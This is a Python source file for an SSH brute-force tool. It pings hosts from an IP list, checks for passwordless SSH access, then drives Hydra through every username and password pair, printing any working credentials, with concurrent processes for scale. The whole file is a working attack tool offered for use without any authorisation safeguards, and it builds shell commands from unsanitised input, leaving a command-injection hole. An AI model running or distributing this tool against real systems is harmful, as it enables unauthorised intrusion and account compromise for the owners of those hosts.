import argparse
import subprocess
import sys
import concurrent.futures

# Function to check if an IP is alive
def check_ping(ip):
    try:
        subprocess.run(["ping", "-c", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

# Function to check if SSH anonymous login is allowed
def check_anonymous_login(ip):
    try:
        ssh_command = f"ssh -o BatchMode=yes -o ConnectTimeout=5 {ip} exit"
        subprocess.run(ssh_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

# Function to check SSH credentials using Hydra
def check_credentials(ip, username, password):
    try:
        command = f"hydra -l {username} -p {password} {ip} ssh"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if "1 of 1 target successfully completed" in result.stdout:
            return True
        else:
            return False

    except subprocess.CalledProcessError:
        return False

# Function to process each IP address
def process_ip(ip, usernames, passwords):
    if not check_ping(ip):
        print(f"IP: {ip} is not reachable.")
        return

    print(f"IP: {ip} is alive.")

    if check_anonymous_login(ip):
        print(f"SSH anonymous login is allowed for IP: {ip}")
        return

    print(f"SSH anonymous login is not allowed for IP: {ip}")

    for username in usernames:
        for password in passwords:
            if check_credentials(ip, username, password):
                print(f"Successful credentials found: IP: {ip}, Username: {username}, Password: {password}")
                return

    print(f"No valid credentials found for IP: {ip}")

def main(ip_file, username_file, password_file, processes):
    with open(ip_file, "r") as file:
        ips = [line.strip() for line in file if line.strip()]

    with open(username_file, "r") as file:
        usernames = [line.strip() for line in file if line.strip()]

    with open(password_file, "r") as file:
        passwords = [line.strip() for line in file if line.strip()]

    with concurrent.futures.ProcessPoolExecutor(max_workers=processes) as executor:
        futures = []
        for ip in ips:
            futures.append(executor.submit(process_ip, ip, usernames, passwords))

        for future in concurrent.futures.as_completed(futures):
            pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Brute-Force Tool")
    parser.add_argument("ip_file", help="Path to the file containing the list of IP addresses")
    parser.add_argument("-U", "--username_file", help="Path to the file containing the list of usernames")
    parser.add_argument("-P", "--password_file", help="Path to the file containing the list of passwords")
    parser.add_argument("-p", "--processes", type=int, default=1, help="Number of processes to use for concurrent execution")
    args = parser.parse_args()

    if not args.username_file or not args.password_file:
        print("Error: Please provide both username and password files.")
        parser.print_help()
        sys.exit(1)

    main(args.ip_file, args.username_file, args.password_file, args.processes)
